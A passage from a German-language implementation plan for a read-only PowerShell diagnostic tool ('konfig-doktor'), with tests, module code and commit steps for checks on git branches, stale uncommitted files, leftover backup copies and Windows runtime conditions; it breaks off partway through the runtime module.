- [ ] **Step 4: Test laufen lassen, Erfolg bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: alle `ok`, `konfig-doktor bestanden`.

- [ ] **Step 5: Commit**

Run: `cd C:\Users\faupe\Documents\BrainFiles; git add Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1; git commit -m "konfig-doktor: Modul regelpaare (Inhalt getrennt von Zeilenenden)" -m "Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>" -- Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1`

---

### Task 5: Modul `git-regeln`

**Files:**
- Modify: `Agenten/Routinen/konfig-doktor.ps1`
- Modify: `Agenten/Routinen/tests/konfig-doktor.test.ps1`

**Interfaces:**
- Consumes: `Add-Befund`, `Invoke-Extern`, `$Wurzel`, `$ModulLimitSek`
- Produces: `Pruefe-GitRegeln`; IDs `GIT-KEIN-REPO`, `GIT-FEHLT`, `GIT-ZWEIGE-NICHT-LESBAR`, `GIT-ZWEIGE`, `GIT-STATUS-NICHT-LESBAR`, `GIT-RUHEND`, `GIT-BESITZ-NICHT-PRUEFBAR`, `GIT-BESITZ`; Hilfe `Get-Python` (gibt Pfad oder `$null`)

- [ ] **Step 1: `bereiche.py --register` als lesend belegen**

`Agenten/Werkzeuge/bereiche.py` lesen (nur lesen). Zu belegen: schreibt `--register` irgendwo (open(..., 'w'), write_text, json.dump in Datei)? Nein -> Aufruf wie unten. Ja -> eine nicht schreibende Variante des Skripts suchen (`--help` lesen) und deren Argument in Step 3 statt `--register` eintragen; gibt es keine, den Besitz-Block durch UNKLAR `GIT-BESITZ-NICHT-PRUEFBAR` ersetzen. Ergebnis im Ledger vermerken.

- [ ] **Step 2: Failing Tests schreiben**

Oberhalb von `# === ENDE` einfügen:

```powershell
Write-Host '--- Modul git-regeln ---'
$fx = Neue-Wurzel
$r = Lauf $fx @('git-regeln')
Pruefe 'ohne .git: UNKLAR statt Fehler' ((Schwere-Von $r 'GIT-KEIN-REPO') -eq 'UNKLAR')
git -C $fx init -q *> $null
git -C $fx symbolic-ref HEAD refs/heads/master *> $null
Schreibe (Join-Path $fx 'a.txt') 'a'
Schreibe (Join-Path $fx 'x y.txt') 'x'
git -C $fx add a.txt 'x y.txt' *> $null
git -C $fx -c user.name=t -c user.email=t@t -c commit.gpgsign=false commit -q -m init *> $null
$r = Lauf $fx @('git-regeln')
Pruefe 'nur master: keine Zweig-Warnung' (-not (Hat $r 'GIT-ZWEIGE'))
git -C $fx branch 'claude/test-x' *> $null
$r = Lauf $fx @('git-regeln')
Pruefe 'Fremdzweig: WARNUNG mit Namen' (((Schwere-Von $r 'GIT-ZWEIGE') -eq 'WARNUNG') -and (($r | Where-Object { $_.id -eq 'GIT-ZWEIGE' }).beleg -match 'claude/test-x'))
$umlaut = 'z ' + [char]0x00E4 + '.txt'
git -C $fx mv 'x y.txt' $umlaut *> $null
Schreibe (Join-Path $fx ('alt ' + [char]0x00F6 + '.txt')) 'alt'
(Get-Item -LiteralPath (Join-Path $fx $umlaut)).LastWriteTime = (Get-Date).AddDays(-10)
(Get-Item -LiteralPath (Join-Path $fx ('alt ' + [char]0x00F6 + '.txt'))).LastWriteTime = (Get-Date).AddDays(-9)
Schreibe (Join-Path $fx 'neu.txt') 'neu'
$r = Lauf $fx @('git-regeln')
$ru = $r | Where-Object { $_.id -eq 'GIT-RUHEND' }
Pruefe 'ruhende Dateien (Leerzeichen, Umlaut, Umbenennung): WARNUNG' (($null -ne $ru) -and ($ru.schwere -eq 'WARNUNG'))
Pruefe 'umbenannte Datei wird unter neuem Namen gefunden' (($null -ne $ru) -and ($ru.beleg -match [regex]::Escape($umlaut)))
Pruefe 'frische Datei zaehlt nicht als ruhend' (($null -ne $ru) -and ($ru.beleg -notmatch 'neu\.txt'))
Pruefe 'ohne bereiche.py: UNKLAR' ((Schwere-Von $r 'GIT-BESITZ-NICHT-PRUEFBAR') -eq 'UNKLAR')
if (Get-Command python -ErrorAction SilentlyContinue) {
    Schreibe (Join-Path $fx 'Agenten/Werkzeuge/bereiche.py') "import sys`nprint('KONFLIKT: demo')`nsys.exit(1)`n"
    $r = Lauf $fx @('git-regeln')
    Pruefe 'Besitz-Konflikt (Exit 1): WARNUNG' ((Schwere-Von $r 'GIT-BESITZ') -eq 'WARNUNG')
}
else { Write-Host '  uebersprungen: Besitz-Test (kein python im PATH)' }

```

- [ ] **Step 3: Test laufen lassen, Fehlschlag bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: Abschnitt `git-regeln` zeigt `FEHLT`.

- [ ] **Step 4: Modul implementieren**

Oberhalb von `# === MODULE` einfügen:

```powershell
# ---------- Modul 4: git-regeln ----------
function Get-Python {
    $venv = Join-Path $Wurzel 'Agenten/Handel/scanner/.venv/Scripts/python.exe'
    if (Test-Path -LiteralPath $venv) { return $venv }
    foreach ($n in 'python', 'python3') {
        $c = Get-Command $n -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($c -and $c.Source -notmatch 'WindowsApps') { return $c.Source }
    }
    return $null
}

function Pruefe-GitRegeln {
    if (-not (Test-Path -LiteralPath (Join-Path $Wurzel '.git'))) {
        Add-Befund -Id 'GIT-KEIN-REPO' -Modul 'git-regeln' -Schwere 'UNKLAR' -Titel 'Wurzel ist kein Git-Repository' `
            -Beleg "Test-Path negativ: $(Join-Path $Wurzel '.git')" -Status 'gesichert' -Vorschlag 'Nur zur Kenntnis (Test-Fixture oder Export)'
        return
    }
    $gc = Get-Command git -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $gc) {
        Add-Befund -Id 'GIT-FEHLT' -Modul 'git-regeln' -Schwere 'UNKLAR' -Titel 'git nicht im PATH' -Beleg 'Get-Command git liefert nichts' `
            -Status 'gesichert' -Vorschlag 'git installieren oder PATH pruefen'
        return
    }
    $git = $gc.Source

    # Zweige gegen die Zweigregel
    $r = Invoke-Extern -Datei $git -Argumente @('-C', $Wurzel, 'for-each-ref', '--format=%(refname)', 'refs/heads', 'refs/remotes') -TimeoutSek $ModulLimitSek
    if ($r.TimedOut -or $r.ExitCode -ne 0) {
        $e1 = (($r.Err -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 1)
        Add-Befund -Id 'GIT-ZWEIGE-NICHT-LESBAR' -Modul 'git-regeln' -Schwere 'UNKLAR' -Titel 'Zweige nicht lesbar' `
            -Beleg "TimedOut=$($r.TimedOut) Exit=$($r.ExitCode) $e1" -Status 'gesichert' -Vorschlag 'git for-each-ref von Hand ausfuehren'
    }
    else {
        $erlaubt = '^refs/heads/(master|zwischenstand)$|^refs/remotes/origin/(master|zwischenstand|HEAD)$'
        $fremd = @($r.Out -split "`r?`n" | Where-Object { $_ -and $_ -notmatch $erlaubt } | ForEach-Object { $_ -replace '^refs/(heads|remotes)/', '' })
        if ($fremd.Count -gt 0) {
            Add-Befund -Id 'GIT-ZWEIGE' -Modul 'git-regeln' -Schwere 'WARNUNG' -Titel "$($fremd.Count) Zweig(e) ausserhalb der Zweigregel (nur master, zwischenstand)" `
                -Beleg (($fremd | Select-Object -First 10) -join ', ') -Status 'gesichert' `
                -Vorschlag 'Offene PR-Zweige sind erlaubt (Ausnahme seit 29.09.2026); alle anderen auf master fuehren und loeschen - nur nach Freigabe'
        }
    }

    # ruhende, uncommittete Dateien
    $s = Invoke-Extern -Datei $git -Argumente @('-c', 'core.quotepath=false', '-C', $Wurzel, 'status', '--porcelain') -TimeoutSek $ModulLimitSek
    if ($s.TimedOut -or $s.ExitCode -ne 0) {
        Add-Befund -Id 'GIT-STATUS-NICHT-LESBAR' -Modul 'git-regeln' -Schwere 'UNKLAR' -Titel 'git status nicht lesbar oder zu langsam' `
            -Beleg "TimedOut=$($s.TimedOut) Exit=$($s.ExitCode)" -Status 'gesichert' -Vorschlag 'git status von Hand ausfuehren; Index-Sperre oder sehr grosser Arbeitsbaum?'
    }
    else {
        $jetzt = Get-Date
        $alt = New-Object System.Collections.ArrayList
        $zeilen = @($s.Out -split "`r?`n" | Where-Object { $_.Length -gt 3 })
        foreach ($z in ($zeilen | Select-Object -First 300)) {
            $p = $z.Substring(3)
            if ($p -match ' -> ') { $p = ($p -split ' -> ')[-1] }
            if ($p.Length -ge 2 -and $p.StartsWith('"') -and $p.EndsWith('"')) {
                $p = ($p.Substring(1, $p.Length - 2) -replace '\\"', '"') -replace '\\\\', '\'
            }
            $p = $p.TrimEnd('/')
            $it = Get-Item -LiteralPath (Join-Path $Wurzel $p) -Force -ErrorAction SilentlyContinue
            if ($it) {
                $tage = ($jetzt - $it.LastWriteTime).TotalDays
                if ($tage -ge 3) { [void]$alt.Add([pscustomobject]@{ Pfad = $p; Tage = [int]$tage }) }
            }
        }
        if ($alt.Count -gt 0) {
            $aelteste = @($alt | Sort-Object Tage -Descending | Select-Object -First 5)
            $schwere = 'HINWEIS'
            if ($aelteste[0].Tage -ge 7) { $schwere = 'WARNUNG' }
            Add-Befund -Id 'GIT-RUHEND' -Modul 'git-regeln' -Schwere $schwere -Titel "$($alt.Count) uncommittete Eintraege aelter als 3 Tage ($($zeilen.Count) insgesamt geaendert)" `
                -Beleg ('Aelteste: ' + (($aelteste | ForEach-Object { "$($_.Pfad) ($($_.Tage) d)" }) -join '; ')) -Status 'gesichert' `
                -Vorschlag 'Gehoert die Arbeit einer Sitzung? Dann committen (gezielt, nur eigene Dateien) - lange ungesicherte Arbeit war die Ursache gefuehlt verlorener Arbeit'
        }
    }

    # Besitz-Verstoesse
    $bpy = Join-Path $Wurzel 'Agenten/Werkzeuge/bereiche.py'
    if (-not (Test-Path -LiteralPath $bpy)) {
        Add-Befund -Id 'GIT-BESITZ-NICHT-PRUEFBAR' -Modul 'git-regeln' -Schwere 'UNKLAR' -Titel 'Besitzpruefung nicht moeglich' `
            -Beleg "Test-Path negativ: $bpy" -Status 'gesichert' -Vorschlag 'Nur zur Kenntnis (Fixture oder Export)'
        return
    }
    $py = Get-Python
    if (-not $py) {
        Add-Befund -Id 'GIT-BESITZ-NICHT-PRUEFBAR' -Modul 'git-regeln' -Schwere 'UNKLAR' -Titel 'Besitzpruefung nicht moeglich: kein Python' `
            -Beleg 'Weder venv noch python/python3 im PATH gefunden' -Status 'gesichert' -Vorschlag 'Python bereitstellen'
        return
    }
    $b = Invoke-Extern -Datei $py -Argumente @($bpy, '--register') -TimeoutSek $ModulLimitSek -Arbeitsordner $Wurzel
    if ($b.TimedOut) {
        Add-Befund -Id 'GIT-BESITZ-NICHT-PRUEFBAR' -Modul 'git-regeln' -Schwere 'UNKLAR' -Titel 'Besitzpruefung im Zeitlimit nicht fertig' `
            -Beleg "Abbruch nach $ModulLimitSek s" -Status 'gesichert' -Vorschlag 'bereiche.py --register von Hand ausfuehren'
    }
    elseif ($b.ExitCode -eq 1) {
        $zl = @(($b.Out + "`n" + $b.Err) -split "`r?`n" | Where-Object { $_.Trim() } | Select-Object -First 5) -join ' / '
        Add-Befund -Id 'GIT-BESITZ' -Modul 'git-regeln' -Schwere 'WARNUNG' -Titel 'Besitz-Verstoss gemeldet' -Beleg "bereiche.py --register Exit 1: $zl" `
            -Status 'gesichert' -Vorschlag 'Als BEFUND melden (--aufrufer <bereich> --pfad <pfad>); nicht blockieren'
    }
    elseif ($b.ExitCode -ne 0) {
        Add-Befund -Id 'GIT-BESITZ-NICHT-PRUEFBAR' -Modul 'git-regeln' -Schwere 'UNKLAR' -Titel 'Besitzpruefung lieferte unerwarteten Exit-Code' `
            -Beleg "bereiche.py --register Exit $($b.ExitCode)" -Status 'gesichert' -Vorschlag 'Skript von Hand ausfuehren'
    }
}

```

(Falls Step 1 ein anderes Argument als `--register` ergab: dieses in `-Argumente @($bpy, '--register')` einsetzen.)

- [ ] **Step 5: Test laufen lassen, Erfolg bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: alle `ok` (oder `uebersprungen` für den Python-Test), `konfig-doktor bestanden`.

- [ ] **Step 6: Commit**

Run: `cd C:\Users\faupe\Documents\BrainFiles; git add Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1; git commit -m "konfig-doktor: Modul git-regeln (Zweige, ruhende Dateien, Besitz)" -m "Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>" -- Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1`

---

### Task 6: Modul `ballast`

**Files:**
- Modify: `Agenten/Routinen/konfig-doktor.ps1`
- Modify: `Agenten/Routinen/tests/konfig-doktor.test.ps1`

**Interfaces:**
- Consumes: `Add-Befund`, `$Wurzel`
- Produces: `Pruefe-Ballast`; IDs `BALLAST-ALTKOPIEN`, `BALLAST-DOPPELNAMEN`, `BALLAST-TXT-ZWILLINGE`, `BALLAST-ZUSATZORDNER`; Hilfe `Get-Levenshtein <string> <string>` gibt int

- [ ] **Step 1: Failing Tests schreiben**

Oberhalb von `# === ENDE` einfügen:

```powershell
Write-Host '--- Modul ballast ---'
$fx = Neue-Wurzel
Schreibe (Join-Path $fx 'Agenten/Hermes/config.yaml') 'a'
Schreibe (Join-Path $fx 'Agenten/Hermes/config.yaml.txt') 'a'
Schreibe (Join-Path $fx 'Agenten/Hermes/config.yaml.bak-20260101') 'a'
Schreibe (Join-Path $fx 'Agenten/Hermes/auth.json.corrupt') 'a'
Schreibe (Join-Path $fx 'Agenten/Hermes/notiz.vor-umbau') 'a'
Schreibe (Join-Path $fx 'Agenten/Routinen/sichern-aussenhaus.ps1') 'a'
Schreibe (Join-Path $fx 'Agenten/Routinen/sichern-ausser-haus.ps1') 'a'
Schreibe (Join-Path $fx 'Agenten/Routinen/a.ps1') 'a'
Schreibe (Join-Path $fx 'Agenten/Routinen/b.ps1') 'a'
Schreibe (Join-Path $fx 'Agenten/Werkstatt/rest.txt') 'a'
$r = Lauf $fx @('ballast')
$ak = $r | Where-Object { $_.id -eq 'BALLAST-ALTKOPIEN' }
Pruefe 'Altkopien gefunden (bak, corrupt, vor-)' (($null -ne $ak) -and ($ak.beleg -match 'config\.yaml\.bak-20260101') -and ($ak.beleg -match 'auth\.json\.corrupt') -and ($ak.beleg -match 'notiz\.vor-umbau'))
Pruefe 'normale Datei ist keine Altkopie' (($null -ne $ak) -and ($ak.beleg -notmatch 'config\.yaml(?!\.)'))
$dn = $r | Where-Object { $_.id -eq 'BALLAST-DOPPELNAMEN' }
Pruefe 'aehnliche Skriptnamen gemeldet' (($null -ne $dn) -and ($dn.beleg -match 'sichern-aussenhaus\.ps1') -and ($dn.beleg -match 'sichern-ausser-haus\.ps1'))
Pruefe 'kurze Namen a/b sind kein Doppelname' (($null -ne $dn) -and ($dn.beleg -notmatch 'a\.ps1'))
Pruefe 'txt-Zwilling einer Config gemeldet' ((Hat $r 'BALLAST-TXT-ZWILLINGE') -and (($r | Where-Object { $_.id -eq 'BALLAST-TXT-ZWILLINGE' }).beleg -match 'config\.yaml\.txt'))
Pruefe 'Zusatzordner Agenten/Werkstatt gemeldet' ((Hat $r 'BALLAST-ZUSATZORDNER') -and (($r | Where-Object { $_.id -eq 'BALLAST-ZUSATZORDNER' }).beleg -match 'Werkstatt'))
Pruefe 'alles nur HINWEIS' (@($r | Where-Object { $_.schwere -ne 'HINWEIS' -and $_.modul -eq 'ballast' }).Count -eq 0)
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('ballast')
Pruefe 'leere Wurzel: kein Ballast, kein Absturz' (@($r | Where-Object { $_.modul -eq 'ballast' }).Count -eq 0)

```

- [ ] **Step 2: Test laufen lassen, Fehlschlag bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: Abschnitt `ballast` zeigt `FEHLT`.

- [ ] **Step 3: Modul implementieren**

Oberhalb von `# === MODULE` einfügen:

```powershell
# ---------- Modul 5: ballast (nur melden, nichts aufraeumen) ----------
function Get-Levenshtein([string]$a, [string]$b) {
    $la = $a.Length
    $lb = $b.Length
    if ($la -eq 0) { return $lb }
    if ($lb -eq 0) { return $la }
    $prev = 0..$lb
    for ($i = 1; $i -le $la; $i++) {
        $cur = New-Object int[] ($lb + 1)
        $cur[0] = $i
        for ($j = 1; $j -le $lb; $j++) {
            $kosten = 1
            if ($a[$i - 1] -ceq $b[$j - 1]) { $kosten = 0 }
            $cur[$j] = [Math]::Min([Math]::Min($cur[$j - 1] + 1, $prev[$j] + 1), $prev[$j - 1] + $kosten)
        }
        $prev = $cur
    }
    return $prev[$lb]
}

function Pruefe-Ballast {
    $ordner = @('', 'Agenten', 'Agenten/Routinen', 'Agenten/Hermes', 'Agenten/Bus', 'Agenten/Handel', 'Agenten/Werkzeuge')
    $alt = New-Object System.Collections.ArrayList
    $doppel = New-Object System.Collections.ArrayList
    $zwillinge = New-Object System.Collections.ArrayList
    foreach ($rel in $ordner) {
        $d = $Wurzel
        $anzeige = '.'
        if ($rel) { $d = Join-Path $Wurzel $rel; $anzeige = $rel }
        if (-not (Test-Path -LiteralPath $d)) { continue }
        $dateien = @(Get-ChildItem -LiteralPath $d -File -Force -ErrorAction SilentlyContinue)
        foreach ($f in $dateien) {
            if ($f.Name -match '(?i)\.(bak|orig|corrupt|old)($|[._-])|\.vor-') { [void]$alt.Add("$anzeige/$($f.Name)") }
            if ($f.Name -match '(?i)\.txt$') {
                $basis = $f.Name.Substring(0, $f.Name.Length - 4)
                if ($basis -and (Test-Path -LiteralPath (Join-Path $d $basis))) { [void]$zwillinge.Add("$anzeige/$($f.Name)") }
            }
        }
        $skripte = @($dateien | Where-Object { $_.Extension -match '(?i)^\.(ps1|py|cmd)$' })
        for ($i = 0; $i -lt $skripte.Count; $i++) {
            for ($j = $i + 1; $j -lt $skripte.Count; $j++) {
                if ($skripte[$i].Extension -ine $skripte[$j].Extension) { continue }
                $na = ($skripte[$i].BaseName.ToLowerInvariant() -replace '[-_ ]', '')
                $nb = ($skripte[$j].BaseName.ToLowerInvariant() -replace '[-_ ]', '')
                if ($na.Length -lt 8 -or $nb.Length -lt 8) { continue }
                if ($doppel.Count -ge 20) { continue }
                if ((Get-Levenshtein $na $nb) -le 2) { [void]$doppel.Add("$anzeige/$($skripte[$i].Name) ~ $($skripte[$j].Name)") }
            }
        }
    }
    $agenten = Join-Path $Wurzel 'Agenten'
    $zusatz = New-Object System.Collections.ArrayList
    if (Test-Path -LiteralPath $agenten) {
        foreach ($n in 'Werkstatt', 'Modelle', 'MaxHirn', 'Agenten') {
            $p = Join-Path $agenten $n
            if (Test-Path -LiteralPath $p) {
                $anz = @(Get-ChildItem -LiteralPath $p -File -Force -ErrorAction SilentlyContinue).Count
                [void]$zusatz.Add("Agenten/$n ($anz Dateien auf Ebene 1)")
            }
        }
    }
    if ($alt.Count -gt 0) {
        Add-Befund -Id 'BALLAST-ALTKOPIEN' -Modul 'ballast' -Schwere 'HINWEIS' -Titel "$($alt.Count) Altkopien (.bak/.orig/.corrupt/.vor-)" `
            -Beleg (($alt | Select-Object -First 12) -join '; ') -Status 'gesichert' -Vorschlag 'Aufraeumen ist Teilprojekt B; vorher Inhalt gegen die aktuelle Datei pruefen'
    }
    if ($doppel.Count -gt 0) {
        Add-Befund -Id 'BALLAST-DOPPELNAMEN' -Modul 'ballast' -Schwere 'HINWEIS' -Titel "$($doppel.Count) Skriptpaar(e) mit fast gleichem Namen" `
            -Beleg ($doppel -join '; ') -Status 'Vermutung' -Vorschlag 'Pruefen, welches aufgerufen wird (Aufrufer suchen), dann das andere in Teilprojekt B entfernen'
    }
    if ($zwillinge.Count -gt 0) {
        Add-Befund -Id 'BALLAST-TXT-ZWILLINGE' -Modul 'ballast' -Schwere 'HINWEIS' -Titel "$($zwillinge.Count) .txt-Zwilling(e) von Dateien" `
            -Beleg ($zwillinge -join '; ') -Status 'Vermutung' -Vorschlag 'Ist die .txt eine Kopie (z. B. zum Anhaengen an eine Mail)? Dann in Teilprojekt B entfernen'
    }
    if ($zusatz.Count -gt 0) {
        Add-Befund -Id 'BALLAST-ZUSATZORDNER' -Modul 'ballast' -Schwere 'HINWEIS' -Titel 'Ordner unter Agenten/, die wie Wurzelordner heissen' `
            -Beleg ($zusatz -join '; ') -Status 'Vermutung' -Vorschlag 'Inhalt ansehen: gehoert er in die gleichnamige Wurzel? Zusammenfuehren in Teilprojekt B'
    }
}

```

- [ ] **Step 4: Test laufen lassen, Erfolg bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: alle `ok`, `konfig-doktor bestanden`.

- [ ] **Step 5: Commit**

Run: `cd C:\Users\faupe\Documents\BrainFiles; git add Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1; git commit -m "konfig-doktor: Modul ballast (Altkopien, Doppelnamen, Zwillinge)" -m "Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>" -- Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1`

---

### Task 7: Modul `laufzeit`

**Files:**
- Modify: `Agenten/Routinen/konfig-doktor.ps1`
- Modify: `Agenten/Routinen/tests/konfig-doktor.test.ps1`

**Interfaces:**
- Consumes: `Add-Befund`, `Invoke-Extern`, `$Wurzel`, `$OhneExtern`, `$ModulLimitSek`
- Produces: `Pruefe-Laufzeit`; IDs `LAUFZEIT-NICHT-WINDOWS`, `LAUFZEIT-JUNCTION-<Modelle|Werkstatt>`, `LAUFZEIT-PLATZ-<n>`, `LAUFZEIT-PLATZ-NICHT-PRUEFBAR`, `LAUFZEIT-DOCKER`, `LAUFZEIT-WSL`

- [ ] **Step 1: `plattenplatz-pruefen.ps1` als lesend belegen**

`Agenten/Routinen/plattenplatz-pruefen.ps1` lesen. Zu belegen: keine Schreib-/Lösch-/Verschiebe-Aufrufe bei `-OhneOrdner`; Ausgabeformat `WARN ...` / `INFO ...` je Zeile; wie die Commit-Reserve in der Zeile benannt ist (Wort für das Match `Commit` in Step 3 anpassen, falls es anders heißt). Ergebnis im Ledger vermerken. Schreibt das Skript, den Aufruf durch UNKLAR `LAUFZEIT-PLATZ-NICHT-PRUEFBAR` ersetzen.

- [ ] **Step 2: Failing Tests schreiben**

Oberhalb von `# === ENDE` einfügen:

```powershell
Write-Host '--- Modul laufzeit ---'
$fx = Neue-Wurzel
Schreibe (Join-Path $fx 'Agenten/Routinen/plattenplatz-pruefen.ps1') ("param([switch]`$OhneOrdner)`nWrite-Output 'INFO alles gut'`nWrite-Output 'WARN Commit-Reserve 3 GB unter Schwelle'`nWrite-Output 'WARN Laufwerk G: nur 2 GB frei'`nexit 1`n")
New-Item -ItemType Directory -Path (Join-Path $fx 'Werkstatt') | Out-Null
$ziel = Neue-Wurzel
New-Item -ItemType Junction -Path (Join-Path $fx 'Modelle') -Target $ziel | Out-Null
$r = Lauf $fx @('laufzeit')
Pruefe 'lebende Junction und normaler Ordner: kein Junction-Befund' (-not (Hat $r 'LAUFZEIT-JUNCTION-Modelle') -and -not (Hat $r 'LAUFZEIT-JUNCTION-Werkstatt'))
$pl = @($r | Where-Object { $_.id -like 'LAUFZEIT-PLATZ-[0-9]*' })
Pruefe 'Commit-Reserve unter Schwelle: KRITISCH' (@($pl | Where-Object { $_.schwere -eq 'KRITISCH' -and $_.beleg -match 'Commit' }).Count -eq 1)
Pruefe 'Plattenplatz-Warnung: WARNUNG' (@($pl | Where-Object { $_.schwere -eq 'WARNUNG' -and $_.beleg -match 'Laufwerk G' }).Count -eq 1)
Pruefe 'INFO-Zeilen werden nicht gemeldet' ($pl.Count -eq 2)
Remove-Item -LiteralPath $ziel -Recurse -Force
$r = Lauf $fx @('laufzeit')
Pruefe 'tote Junction: KRITISCH' ((Hat $r 'LAUFZEIT-JUNCTION-Modelle') -and ((Schwere-Von $r 'LAUFZEIT-JUNCTION-Modelle') -eq 'KRITISCH'))
[System.IO.Directory]::Delete((Join-Path $fx 'Modelle'))
Remove-Item -LiteralPath (Join-Path $fx 'Werkstatt') -Force
$r = Lauf $fx @('laufzeit')
Pruefe 'fehlender Ordner: KRITISCH' ((Schwere-Von $r 'LAUFZEIT-JUNCTION-Werkstatt') -eq 'KRITISCH')
Remove-Item -LiteralPath (Join-Path $fx 'Agenten/Routinen/plattenplatz-pruefen.ps1')
$r = Lauf $fx @('laufzeit')
Pruefe 'ohne plattenplatz-pruefen.ps1: UNKLAR' ((Schwere-Von $r 'LAUFZEIT-PLATZ-NICHT-PRUEFBAR') -eq 'UNKLAR')

```

- [ ] **Step 3: Test laufen lassen, Fehlschlag bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: Abschnitt `laufzeit` zeigt `FEHLT`.

- [ ] **Step 4: Modul implementieren**

Oberhalb von `# === MODULE` einfügen:

```powershell
# ---------- Modul 6: laufzeit ----------
function Pruefe-Laufzeit {
    if ($env:OS -ne 'Windows_NT') {
        Add-Befund -Id 'LAUFZEIT-NICHT-WINDOWS' -Modul 'laufzeit' -Schwere 'UNKLAR' -Titel 'Laufzeitpruefung uebersprungen (kein Windows)' `
            -Beleg 'Linux/Cloud-Checkout: Junctions, Laufwerke, Docker/WSL nicht vergleichbar' -Status 'gesichert' -Vorschlag 'Auf Max'' Rechner ausfuehren'
        return
    }
    foreach ($n in 'Modelle', 'Werkstatt') {
        $p = Join-Path $Wurzel $n
        $item = Get-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
        $link = 'kein Link'
        if ($item -and $item.LinkType) { $link = "$($item.LinkType) -> $(@($item.Target) -join ',')" }
        if (-not (Test-Path -LiteralPath $p)) {
            Add-Befund -Id "LAUFZEIT-JUNCTION-$n" -Modul 'laufzeit' -Schwere 'KRITISCH' -Titel "$n/ fehlt oder das Junction-Ziel ist nicht erreichbar" `
                -Beleg "Test-Path negativ fuer $p ($link)" -Status 'gesichert' -Vorschlag 'Laufwerk O: pruefen (angeschlossen?), danach Junction neu setzen - nach Freigabe'
            continue
        }
        try { Get-ChildItem -LiteralPath $p -Force -ErrorAction Stop | Select-Object -First 1 | Out-Null }
        catch {
            Add-Befund -Id "LAUFZEIT-JUNCTION-$n" -Modul 'laufzeit' -Schwere 'KRITISCH' -Titel "$n/ ist nicht lesbar" `
                -Beleg "Get-ChildItem scheitert fuer $p ($link)" -Status 'gesichert' -Vorschlag 'Berechtigungen und Laufwerk pruefen'
        }
    }
    $pp = Join-Path $Wurzel 'Agenten/Routinen/plattenplatz-pruefen.ps1'
    if (-not (Test-Path -LiteralPath $pp)) {
        Add-Befund -Id 'LAUFZEIT-PLATZ-NICHT-PRUEFBAR' -Modul 'laufzeit' -Schwere 'UNKLAR' -Titel 'plattenplatz-pruefen.ps1 nicht vorhanden' `
            -Beleg "Test-Path negativ: $pp" -Status 'gesichert' -Vorschlag 'Skript wiederherstellen (git)'
    }
    else {
        $ps = (Get-Process -Id $PID).Path
        $r = Invoke-Extern -Datei $ps -Argumente @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $pp, '-OhneOrdner') -TimeoutSek $ModulLimitSek
        if ($r.TimedOut) {
            Add-Befund -Id 'LAUFZEIT-PLATZ-NICHT-PRUEFBAR' -Modul 'laufzeit' -Schwere 'UNKLAR' -Titel 'plattenplatz-pruefen.ps1 antwortet nicht im Zeitlimit' `
                -Beleg "Abbruch nach $ModulLimitSek s" -Status 'gesichert' -Vorschlag 'Skript einzeln ausfuehren'
        }
        else {
            $n = 0
            foreach ($z in ($r.Out -split "`r?`n")) {
                if ($z -notmatch '^\s*WARN\b') { continue }
                $n++
                $schwere = 'WARNUNG'
                if ($z -match '(?i)commit') { $schwere = 'KRITISCH' }
                Add-Befund -Id "LAUFZEIT-PLATZ-$n" -Modul 'laufzeit' -Schwere $schwere -Titel ('Platz/Commit: ' + $z.Trim()) `
                    -Beleg "plattenplatz-pruefen.ps1 -OhneOrdner, Ausgabezeile: $($z.Trim())" -Status 'gesichert' `
                    -Vorschlag 'Platz schaffen bzw. Commit-Reserve pruefen (Auslagerungsdatei, Docker/WSL-Speicher); Aufraeumen nur nach Freigabe'
            }
        }
    }
    if (-not $OhneExtern) {
        $d = Get-Command docker -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($d) {
            $r = Invoke-Extern -Datei $d.Source -Argumente @('info', '--format', '{{.ServerVersion}}') -TimeoutSek 10
            if ($r.TimedOut) {
                Add-Befund -Id 'LAUFZEIT-DOCKER' -Modul 'laufzeit' -Schwere 'WARNUNG' -Titel 'Docker antwortet nicht binnen 10 s' `
                    -Beleg 'docker info: Zeitlimit; haengendes Docker startet MCP-Server im Kreis neu (Spawn-Sturm, siehe Wiki)' -Status 'gesichert' `
                    -Vorschlag 'Docker Desktop neu starten ist Max'' Entscheidung; der Doktor startet nichts'
            }
            elseif ($r.ExitCode -ne 0) {
                Add-Befund -Id 'LAUFZEIT-DOCKER' -Modul 'laufzeit' -Schwere 'HINWEIS' -Titel 'Docker-Daemon laeuft nicht' `
                    -Beleg "docker info Exit $($r.ExitCode)" -Status 'gesichert' -Vorschlag 'Nur relevant, wenn MCP_DOCKER gebraucht wird'
            }
        }
